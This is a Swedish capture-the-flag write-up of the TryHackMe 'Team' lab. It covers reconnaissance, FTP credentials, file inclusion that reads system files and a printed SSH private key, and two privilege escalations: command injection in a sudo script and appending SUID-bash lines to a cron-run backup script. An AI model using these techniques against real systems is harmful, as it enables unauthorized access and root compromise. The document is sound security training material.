# Challenge: Team

https://tryhackme.com/room/teamcw

![Screenshot](img/Pasted%20image%2020251110121657.png)

## Initial Recon

Vi började med att köra nmap, visade sig att port 21 (ftp), 22 (ssh) och 80 (http) är öppna.

![Screenshot](img/Pasted%20image%2020251110121817.png)

Jag gick därefter ut på hemsidan för att se vad jag kunde hitta, `http://10.10.5.55`. Dock kom vi bara till template-sidan för Apache2 Ubuntu:

![Screenshot](img/Pasted%20image%2020251110122514.png)

Ett par körningar med **Gobuster** och typ **ffuf** gav inget mer än en 403 på `/server-status` vilket är standard.

## Digging Deeper

Vid en närmare titt så stod det i hemsidans title-element "If it works, add **team.thm** to your hosts file". Jag tänkte först att det inte skulle ge oss något mer, utan endast vara ett sätt för oss att gå till just *team.thm* istället för att uppge hela IP-adressen. Men när jag lade till IP och namn i `/etc/hosts` och gick till `http://team.thm` så märkte jag direkt att jag kom till en fin hemsida.

Dags att sätta igång **Gobuster** igen och även kolla närmare på hemsidans kod.

Min kompis gjorde en körning med **feroxbuster** och fick en hel del intressanta träffar, bland annat `/scripts/script.txt` och `/scripts/script.old`

![Screenshot](img/Pasted%20image%2020251110131816.png)

I `script.old` hittade vi användaruppgifter för FTP, närmare bestämt en stor base64-encoded blob, men när den decode:ades kunde vi läsa ut `ftpuser:T3@m$h@r3`

## FTP

När vi loggade in via FTP kunde vi hitta en textfil i `/workshare/New_site.txt` som avslöjade att någon utvecklar en sida för teamet:

```
Dale
I have started coding a new website in PHP for the team to use, this is currently under development. It can be found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles
```
## Let's add a Subdomain

Vi lade till `dev.team.thm` i hosts-filen och tog oss en närmare titt. Det är verkligen en work-in-progress, men det verkar vara början på nån slags **team share/shared folder**.

![Screenshot](img/Pasted%20image%2020251110131432.png)

![Screenshot](img/Pasted%20image%2020251110134713.png)

Inte mycket för världen just nu, men kan det vara så att vi kan ladda upp saker till denna share för att sedan utnyttja någon slags sårbarhet? Kanske kunna ladda upp ett webshell?

## Läsa filer i webbläsaren

Inget webshell, men vi kunde kanske utnyttja att vi fick en "parameter-grej-i-webbläsaren". Alltså utnyttja Remote/Local File Inclusion - att läsa filer från servern direkt i webbläsaren. Min kompis testade att se om det funkade, och javisst. Vi kunde läsa `/ect/passwd`, men även `/etc/ssh/sshd_config`

![Screenshot](img/Pasted%20image%2020251110152938.png)

Det var inte helt enkelt att tyda, men längst ner kunde vi se den privata nyckeln för användaren `Dale` som inleds i slutet av screenshoten ovan. Detta är ingen vanlig placering av privata nycklar, men av någon anledning så hade just detta företaget det som policy... Synd för dem, bra för oss! Nyckeln behövde dock redigeras lite innan jag kunde använda den.

När jag kopierade den från webbläsaren var den skriven på en enda rad och insprängd med flera `#` och mellanslag, antagligen för att varje rad av nyckeln var utkommenterad. Jag tog en titt på hur en vanlig OpenSSH nyckel såg ut (minnet är bra men kort) och redigerade den jag hittade på servern med en enkel find & replace och en enkel regex.

![Screenshot](img/Pasted%20image%2020251110164543.png)

Den privata nyckeln för `Dale` är alltså:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Jag sparade den till filen `key.pem`, körde `chmod 600 key.pem`, därefter kunde jag ssh:a till servern genom `ssh -i key.pem dale@10.10.x.x` och behövde inte uppge något lösenord.

Första flaggan skulle heta `user.txt` och gissningsvis skulle den finnas i samma folder där vi landade när vi loggade in med ssh som dale, vilket även var fallet.

<details>
  <summary><b>Klicka för att se första flaggan</b></summary>

  `THM{6Y0TXHz7c2d}`
</details>

## Privilege Escalation

>Efter att ha testat typ tusen olika sätt att få root-behörighet så kunde vi till slut koka ner processen till följande. Häng med!

Nästa flagga heter `root.txt` och finns antagligen i `/root`. Det gäller alltså att eskalera behörigheterna för att kunna komma åt den, för det får inte användaren `dale` göra.

Efter att ha kört `sudo -l` som **dale** ser vi att man kan köra ett script som dale där **gyles** är owner, och scriptet ser ut så här:

```bash
#!/bin/bash 
printf "Reading stats.\n" 
sleep 1
printf "Reading stats..\n" sleep 1 read -p "Enter name of person backing up the data: " name
echo $name >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error 
printf "The Date is " 
$error 2>/dev/null 
date_save=$(date "+%F-%H-%M") 
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak 
printf "Stats have been backed up\n"
```

Scriptet har en sårbarhet på raderna:

```bash
read -p "Enter 'date' to timestamp the file: " error 
$error 2>/dev/null
```

Scriptet kommer kunna köra vad man än skriver in där. Tillvägagångssättet blir alltså:
- vid första prompten skriver man vad som helst
- vid andra skriver man `/bin/bash` och får då ett shell som **gyles**

Nu har vi alltså ett shell som **gyles** och dags att leta igenom systemet noga. `ls -la /home/gyles` ger många intressanta träffar, bland annat `.bash_history`.

`/home/gyles/.bash_history` innehåller supermånga kommandon, men det intressanta är att användaren skriver till `/opt/admin_stuff/script.sh`

Vid en närmare titt innehåller scriptet:

```shell
#!/bin/bash 
#I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh" main_site="/usr/local/bin/main_backup.sh" 
#Back ups the sites locally 
$main_site 
$dev_site
```

Som kommentaren säger så körs ett cronjob som backar upp hemsidan. Om **gyles** har skrivbehörighet på något av scripten så kan jag redigera det och antingen läsa flaggan i `/root` eller spawna ett root shell.

När jag kör `id` och `groups` som **gyles** ser jag att användaren tillhör grupperna **lxd**, **editors** och **admin**.

Jag körde `ls -la /usr/local/sbin/dev_backup.sh` men ägaren och gruppen är **root**. Efter att ha kört samma kommando på `/usr/local/bin/main_backup.sh` så är ägaren **root**, men filen tillhör gruppen **admin**, gyles kan alltså redigera scriptet!

Jag kommenterade ut raderna i scriptet och lade istället till:

```shell
echo "cp /bin/bash /tmp/rootbash" >> /usr/local/bin/main_backup.sh 
echo "chmod +s /tmp/rootbash" >> /usr/local/bin/main_backup.sh
```

När jag såg att filen **rootbash** var skapad så körde jag `/tmp/rootbash -p`, därefter `whoami` och fick följande svar:

![Screenshot](img/Pasted%20image%2020251110232927.png)

Därefter säkerställde jag att flaggan fanns i `/root` genom `ls -la /root`, därefter `cat /root/root.txt`. 

<details>
  <summary><b>Klicka för att se andra flaggan</b></summary>
  
  `THM{fhqbznavfonq}`
</details>

## Final Words

Än en gång tog en "beginner friendly" challenge otroligt lång tid, men jag lärde mig många saker längs med vägen, bland annat:
- Man kan hitta så mycket mer om man lägger till ett domännamn i `/etc/hosts` än att bara titta på IP-adressen.
- Testa alltid om en hemsida är sårbar för File Inclustion/Path Traversal.
- Hur man kan använda en OpenSSH Private Key för att SSH:a in utan att uppge lösenord.
- Att ett enkelt script kan innehålla sårbarheter som kan spawna ett shell för en annan användare.
- Hur jag kan redigera ett script som körs som cronjob och spawna ett root shell.

Thanks for reading and happy hacking!